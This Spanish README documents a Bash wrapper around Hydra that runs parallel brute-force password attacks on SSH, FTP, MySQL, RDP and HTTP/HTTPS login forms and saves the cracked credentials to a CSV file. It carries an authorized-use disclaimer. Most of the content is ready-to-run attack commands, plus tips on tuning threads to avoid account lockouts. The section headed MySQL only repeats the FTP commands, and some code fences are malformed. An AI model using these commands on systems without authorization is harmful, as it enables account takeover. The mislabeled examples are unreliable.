# force-brute.sh

Pequeño **wrapper para Hydra** que ejecuta ataques de fuerza bruta de forma **paralela**, con **salida en vivo por host** y **reporte CSV sin duplicados**. Pensado para **laboratorios** y **pentesting autorizado**.

> ⚠️ **Uso ético y legal**: este proyecto es para fines educativos y pruebas **con autorización explícita**. No lo uses en sistemas ajenos o sin permiso.

---

## ✨ Características

- Soporta **ssh · ftp · mysql · rdp · http-post-form · https-post-form**
- Paralelismo configurable (por defecto **5 hosts** en paralelo)
- Hilos por host (Hydra `-t`, por defecto **4**)
- **Salida en vivo** con prefijo por IP (`[host] …`)
- **CSV sin duplicados** (`IP,User,Password`)
- **Auto-modo**: si existen `./lib/hosts.txt`, `./lib/user.txt`, `./lib/pass.txt`, se usan automáticamente
- **Pre-chequeo de puerto** opcional (si hay `nc`)
- Un **solo log** (`salidas.log`) y un **reporte por ejecución** (`report_YYYYmmdd-HHMMSS.csv`)
- Modo HTTP “amigable” (arma el triple de Hydra) o directo con `--http-form`
- Atajos: `--single`, `--host-map`, `--zip`
- `-e/--examples` imprime ejemplos de uso y sale

---

## 📦 Requisitos

- Linux (probado en Kali)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- `nc` (netcat) opcional para pre-chequeo de puertos

Instalación típica en Kali:

```bash
sudo apt update
sudo apt install -y hydra netcat-traditional
```
## 📥 Instalación
Copia el script y dale permisos:

```chmod +x force-brute.sh
# Si copiaste desde Windows, quita CRLF:
sed -i 's/\r$//' force-brute.sh
```

## Estructura sugerida:
```
force-brute/
├── force-brute.sh
└── lib/
    ├── hosts.txt
    ├── user.txt
    └── pass.txt
```

## Ejemplo de lib/hosts.txt:
```
192.168.0.2
10.0.0.2
```

## 🚀 Uso rápido
Modo auto (usa ./lib/* si existen)
```
./force-brute.sh
```

Ver ejemplos listos
```
./force-brute.sh -e

```

## 🧰 Opciones
```
-s, --service <svc>     ssh|ftp|mysql|rdp|http-post-form|https-post-form  (default: ssh)
    --port <n>          Puerto (por defecto: ssh:22, ftp:21, mysql:3306, rdp:3389, http:80, https:443)

-i, --ip <host>         Host único (repetible)
    --ip-list <file>    Lista de hosts (default: ./lib/hosts.txt)

-u, --user <name>       Usuario (repetible) [normal o --zip]
    --user-list <file>  Lista de usuarios (default: ./lib/user.txt)
-p, --pass <pwd|csv>    Una contraseña o CSV "a,b,c" [normal o --zip]
    --pass-list <file>  Lista de contraseñas (default: ./lib/pass.txt)

--single user:pass      Un intento por host con ese par
--host-map file.csv     CSV "host,user,pass" (un intento por host)
--zip                   Empareja user-list y pass-list por índice (Hydra -C)

HTTP/HTTPS (elige una forma):
  --http-form "ruta:datos:cond"
     ej: "/login.php:user=^USER^&pass=^PASS^:F=Credenciales inválidas"
  --http-path "/login" --http-data "u=^USER^&p=^PASS^"
     [--http-success "OK"] [--http-fail "Error"] [--http-header "H: V"]...

--threads <n>           Hilos por host (Hydra -t). Default: 4
--parallel <n>          Jobs simultáneos. Default: 5
--no-first              No detener al primer acierto por host (quita -f)
--quiet                 No mostrar cada intento (quita -V)
--very-verbose          Añade -vV (además de -V si aplica)
--no-ignore-restore     No pasar -I a Hydra
--wait <sec>            Hydra -w (timeout por intento). Default: 6

-e, --examples          Mostrar ejemplos y salir
--help                  Ayuda

ENV:
HYDRA_EXTRA="..."       Pasa args extra a Hydra (ej: opciones del módulo HTTP)
```

## 🧪 Ejemplos por servicio
SSH
```
# Listas por defecto (lib/hosts.txt, lib/user.txt, lib/pass.txt)
./force-brute.sh -s ssh

# Un par específico para un host (una sola prueba por host)
./force-brute.sh -s ssh --ip 10.200.6.28 --single root:abcd1234

# Puerto no estándar
./force-brute.sh -s ssh --ip 10.0.0.10 --port 2222 --user-list lib/user.txt --pass-list lib/pass.txt
```
FTP
```
# FTP estándar (21)
./force-brute.sh -s ftp --ip-list lib/hosts.txt --user-list lib/user.txt --pass-list lib/pass.txt

# Puerto personalizado (2121)
./force-brute.sh -s ftp --ip 10.0.0.20 --port 2121 --user-list lib/ftp_users.txt --pass-list lib/ftp_pass.txt
```

MySQL
```
# FTP estándar (21)
./force-brute.sh -s ftp --ip-list lib/hosts.txt --user-list lib/user.txt --pass-list lib/pass.txt

# Puerto personalizado (2121)
./force-brute.sh -s ftp --ip 10.0.0.20 --port 2121 --user-list lib/ftp_users.txt --pass-list lib/ftp_pass.txt
```

RDP (Windows)
```
# Sugerencia: baja hilos para evitar lockouts
./force-brute.sh -s rdp --ip-list lib/win_hosts.txt --user-list lib/win_users.txt --pass-list lib/win_pass.txt --threads 2

```

HTTP (http-post-form) – Forma 1: triple directo
```
./force-brute.sh -s http-post-form --ip 10.0.0.40 \
  --http-form "/login.php:username=^USER^&password=^PASS^:F=Credenciales inválidas"
```

HTTPS (https-post-form) – éxito + header
```
./force-brute.sh -s https-post-form --ip 10.0.0.41 --port 8443 \
  --http-form "/auth:usr=^USER^&pwd=^PASS^:S=Bienvenido:H=User-Agent\:\ Mozilla/5.0" \
  --user-list lib/users.txt --pass-list lib/pass.txt

```
HTTP – Forma 2 (amigable): el script arma el triple
```
./force-brute.sh -s http-post-form --ip 10.0.0.42 \
  --http-path "/login" \
  --http-data "user=^USER^&pass=^PASS^" \
  --http-fail "Login incorrecto" \
  --http-header "X-Requested-With: XMLHttpRequest" \
  --user-list lib/users.txt --pass-list lib/pass.txt

```
F= → texto que indica fallo.
S= → texto que indica éxito.
H= → header adicional (en Hydra los dos puntos dentro del triple se escapan como \:).

## Salidas
Log: salidas.log (append). Cada ejecución comienza con una cabecera:
```
====================================================================
RUN: 2025-09-03T13:12:04-05:00 | user: anreynoso | service: ssh | hosts: 3
====================================================================
[192.168.0.1] [22][ssh] host: 192.168.0.1  login: root   password: abcd1234
```
Reporte: report_YYYYmmdd-HHMMSS.csv con formato:
```
IP,User,Password
10.200.6.28,root,abcd1234
```
Las tuplas (IP,User,Password) no se repiten.

##⚙️ Cómo funciona (en breve)

- Paralelo: hasta --parallel N hosts simultáneos (default 5).

- Hilos por host: --threads N (Hydra -t, default 4).

- Stop en primer hit por host: por defecto sí (-f). Usa --no-first para desactivarlo.

- Pre-chequeo de puerto: si hay nc, se omite el host cuyo puerto no responde.

- Deduplicación: en memoria, antes de escribir al CSV.

- HTTP: puedes pasar --http-form (triple listo) o dejar que el script arme el triple con --http-path/--http-data/--http-success|--http-fail/--http-header.

- Hydra restore: se pasa -I por defecto (ignora sesiones previas). Quita con --no-ignore-restore.
```
##🧯 Troubleshooting
“syntax error near unexpected token `{echo'”
Suele venir de copiar/pegar con caracteres raros o CRLF. Ejecuta:
```
sed -i 's/\r$//' force-brute.sh
bash -n force-brute.sh && echo "OK de sintaxis"

```
No escribe al CSV
Asegúrate de ver líneas tipo login: X password: Y en salidas.log. El parser extrae de esos mensajes de Hydra.
Si tu idioma/cadena de éxito/fallo es distinto, ajusta --http-success/--http-fail.

HTTP con CSRF
Formularios con token requieren pasos extra (capturar y reenviar token). Este wrapper no automatiza CSRF.

RDP / lockouts
Reduce --threads y --parallel para no disparar bloqueos.

## 🤝 Contribuir

Issues y PRs bienvenidos.

Estilo: bash estricto (set -Eeuo pipefail), sin dependencias externas salvo Hydra y utilidades básicas.

## 🪪 Licencia

MIT © @kp01aj